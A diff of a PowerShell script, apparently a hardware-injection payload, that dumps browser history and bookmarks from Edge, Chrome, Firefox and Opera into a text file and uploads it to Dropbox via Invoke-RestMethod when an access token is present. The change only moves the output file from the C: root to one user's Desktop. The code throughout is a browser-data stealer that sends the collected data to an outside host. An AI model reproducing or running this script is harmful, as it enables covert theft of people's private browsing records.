@@ -32,19 +32,19 @@ function Get-BrowserData {
     } 
 }
 
-Get-BrowserData -Browser "edge" -DataType "history" >> c:\BrowserData.txt
+Get-BrowserData -Browser "edge" -DataType "history" >> "C:\Users\fgtbg\Desktop\BrowserData.txt"
 
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> c:\BrowserData.txt
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> "C:\Users\fgtbg\Desktop\BrowserData.txt"
 
-Get-BrowserData -Browser "chrome" -DataType "history" >> c:\BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "history" >> "C:\Users\fgtbg\Desktop\BrowserData.txt"
 
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> c:\BrowserData.txt
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> "C:\Users\fgtbg\Desktop\BrowserData.txt"
 
-Get-BrowserData -Browser "firefox" -DataType "history" >> c:\BrowserData.txt
+Get-BrowserData -Browser "firefox" -DataType "history" >> "C:\Users\fgtbg\Desktop\BrowserData.txt"
 
-Get-BrowserData -Browser "opera" -DataType "history" >> c:\BrowserData.txt
+Get-BrowserData -Browser "opera" -DataType "history" >> "C:\Users\fgtbg\Desktop\BrowserData.txt"
 
-Get-BrowserData -Browser "opera" -DataType "bookmarks" >> c:\BrowserData.txt
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> "C:\Users\fgtbg\Desktop\BrowserData.txt"
 
 # Upload output file to dropbox
 
@@ -68,7 +68,7 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f c:\BrowserData.txt}
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f "C:\Users\fgtbg\Desktop\BrowserData.txt"}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
